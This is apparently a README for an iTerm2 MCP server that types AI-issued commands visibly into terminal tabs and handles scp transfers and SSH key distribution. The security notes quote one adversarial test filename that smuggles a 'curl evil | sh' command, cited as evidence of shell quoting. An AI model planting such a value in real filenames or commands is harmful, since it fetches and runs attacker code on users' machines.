# iterm2-mcp

[![PyPI version](https://img.shields.io/pypi/v/iterm2-mcp-zanlan.svg)](https://pypi.org/project/iterm2-mcp-zanlan/)
[![Python 3.12+](https://img.shields.io/badge/python-3.12%2B-blue.svg)](https://pypi.org/project/iterm2-mcp-zanlan/)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](LICENSE)

**English** | [简体中文](README.zh-CN.md)

An iTerm2 MCP server built around **visible execution**: every command is injected into a terminal session as **typed text (send text)** — exactly as if the user typed it — so everything stays on screen and under your supervision. **There is no exec / silent-execution tool of any kind.**

Inspired by electerm's MCP integration and [ferrislucas/iterm-mcp](https://github.com/ferrislucas/iterm-mcp), customized for multi-server profile management.

## Features

- **Connect via saved iTerm2 profiles**: open a new tab by profile name (or GUID); duplicate profile names raise an error listing all GUIDs — it never silently connects to the wrong machine
- **Visible execution**: `send_command` is equivalent to typing a command and pressing Enter; `send_text` feeds input step by step for REPLs / interactive programs. There is no execution channel that bypasses the terminal screen
- **Address sessions by name**: after a tab is created, its session is automatically registered under the profile name; the agent can rename it at any time, and all other tools address sessions by name
- **Auto-login**: when a profile auto-types its password, the server detects the password prompt and sends the confirming Enter for you
- **File transfer**: `upload_file` / `download_file` drive `scp` from a local shell session (Mac-initiated outbound connection — works with public-internet servers); `distribute_key` sends your Mac's public key into an already-logged-in server session (no password needed), after which transfers run fully automatically; `check_transfer` verifies md5 on both ends
- Multi-session management: list / focus (switch tab) / close

## Tools

| Tool | Description |
|---|---|
| `list_profiles` | List all iTerm2 profile names (duplicates flagged) |
| `list_sessions` | List all window/tab/session entries (id, name, MCP name) |
| `create_session` | Open a new tab by profile name; session auto-named after the profile |
| `create_session_by_guid` | Open a tab by profile GUID (for disambiguating duplicate names) |
| `focus_session` | Focus the iTerm2 window on a session (select its tab and bring to front) |
| `close_session` | Close a session (by name or id) |
| `rename_session` | Rename a session |
| `send_command` | Send one line of command to a session (auto `\n`, visible as typed) |
| `send_text` | Send raw text/keystrokes to a session (for REPLs; no trailing newline) |
| `read_screen` | Read a session's current screen contents (line by line) |
| `interrupt` | Send Ctrl+C to a session |
| `create_local_session` | Open a local shell tab registered as `local-shell` (used by transfer tools) |
| `upload_file` | Upload a local file to a server via scp (Mac-initiated) |
| `download_file` | Download a server file to local via scp (Mac-initiated) |
| `distribute_key` | Send Mac's public key into a logged-in server session + pre-scan host key (one-time, passwordless afterwards) |
| `check_transfer` | Verify transfer integrity by comparing remote/local md5 |

Every tool that accepts a name also accepts a session id — the `name_or_id` parameter auto-detects.

## Requirements

- macOS + iTerm2 ≥ 3.5, with Settings → General → Magic → Enable Python API turned on
- Python 3.12+

## Install & Register

### Prerequisite: pipx or uv (pick one, if not installed yet)

Method 1 / Method 2 depend on the `pipx` / `uvx` commands. Install one first (via Homebrew on macOS):

```bash
brew install pipx          # https://pipx.pypa.io
# or
brew install uv            # https://docs.astral.sh/uv/ (provides uvx)
```

On machines without Homebrew, use the official installers at the links above — or skip ahead to Method 3.

### Method 1: pipx (recommended, isolated environment)

```bash
pipx install iterm2-mcp-zanlan
```

Then register (Claude Desktop / .mcp.json JSON config):

```json
{
  "mcpServers": {
    "iterm2": {
      "command": "iterm2-mcp"
    }
  }
}
```

One-liner for Claude Code:

```bash
claude mcp add iterm2 -- iterm2-mcp
```

### Method 2: uvx, zero install

```json
{
  "mcpServers": {
    "iterm2": {
      "command": "uvx",
      "args": ["iterm2-mcp-zanlan"]
    }
  }
}
```

### Method 3: from source

```bash
git clone https://github.com/Zane-lan/iterm2-mcp.git
cd iterm2-mcp
pip install iterm2 "mcp[cli]>=1,<2"   # homebrew Python: add --user --break-system-packages
```

```json
{
  "mcpServers": {
    "iterm2": {
      "command": "/path/to/python3.12",
      "args": ["/path/to/iterm2-mcp/src/iterm2_mcp/server.py"]
    }
  }
}
```

## Design decisions

1. **Duplicate-profile protection**: opening a tab by name that matches multiple profiles raises an error listing every GUID — the user picks one (or deletes the duplicates in iTerm2); a GUID-based tool is provided as the escape hatch
2. **Auto-naming on creation**: a tab opened via a profile is registered under the profile name, so later tools can address it by name
3. **Name addressing uses an MCP-maintained registry** (`~/.config/iterm2-mcp/registry.json`) — in practice, shell integration resets the session title back to an automatic name (e.g. `~ (-zsh)`) after every command via OSC escape sequences, so `session.name` is unreliable; `set_name` is still attempted for a readable tab title, but addressing never depends on it; a live `session.name` prefix match serves as fallback when the registry misses
4. **Send-only, no exec**: no tool in the set bypasses the terminal screen
5. **Passwordless transfers are keyed on the exact `user@host` string**: `distribute_key` records which `user@host` it provisioned, and the transfer tools refuse any other spelling (a different user, or an IP swapped for `localhost`/a hostname) with an error that lists the registered forms — the failure mode this prevents is a *silent* stall at a password prompt in a different session or with a different spelling

## Security notes

- **Local only**: the server runs over stdio, listens on no port, and only the AI client you register can talk to it. Running arbitrary commands in your terminal is the product, not a side effect — review commands as they appear.
- **Shell quoting**: all paths and credentials passed to `scp` / `ssh` in transfer tools are shell-quoted on both the local and the remote command line (verified against adversarial filenames like `x"; curl evil | sh; #.log`).
- **Host-key trust (TOFU)**: `distribute_key` runs `ssh-keyscan` and writes the returned host key into `known_hosts` without out-of-band verification — the same trust-on-first-use tradeoff `ssh-keyscan` itself makes. If you need protection against a man-in-the-middle on first connect, verify the fingerprint yourself before using the transfer tools.
- **`distribute_key` grants standing access**: it appends your public key to the server's `authorized_keys`. To revoke, remove the line from `~/.ssh/authorized_keys` on that server.

## Troubleshooting

**"A failed transfer leaves the terminal stuck."** Before every transfer the server interrupts any foreground process, force-clears the screen (`\033[2J\033[H`, not the `clear` builtin) and waits until the screen settles — so a password prompt left over from a previous failed attempt can no longer swallow the next command or corrupt its result.

**"Passwordless works in one session but not another."** Passwordless state lives in two places: your public key in the server's `~/.ssh/authorized_keys` (per **user**) and the host key in your Mac's `~/.ssh/known_hosts` (matched by the **exact host string** you typed). So `root@10.10.10.136` and `mbs@10.10.10.136` are different targets, and `root@localhost` is a different target from `root@10.10.10.136` even on the same machine. Always pass `server_user`/`server_host` exactly as you did in `distribute_key`; since 0.2.4 the transfer tools reject any unregistered spelling with an error listing the registered ones.

## Verification

The end-to-end integration test runs against a real iTerm2 (opens tabs, sends commands, Ctrl+C, closes tabs):

```bash
python3.12 test_e2e.py
```

## Implementation notes (pitfalls found the hard way)

- iTerm2 3.6.x no longer listens on TCP 1912; the Python API moved to a Unix Domain Socket (`~/Library/Application Support/iTerm2/private/socket`), which the official `iterm2` package auto-detects
- When driving the iterm2 package from a custom event loop, you must also start the `Connection._async_dispatch_forever` dispatch loop — otherwise every RPC hangs forever
- `iterm2` 2.30: entry point is `iterm2.run_until_complete(coro)`; `ScreenContents` uses the `line(i)` method; `App.current_session` is gone
- FastMCP's lifespan must be passed to the `FastMCP(...)` constructor; setting `settings.lifespan` afterwards has no effect

## License

MIT
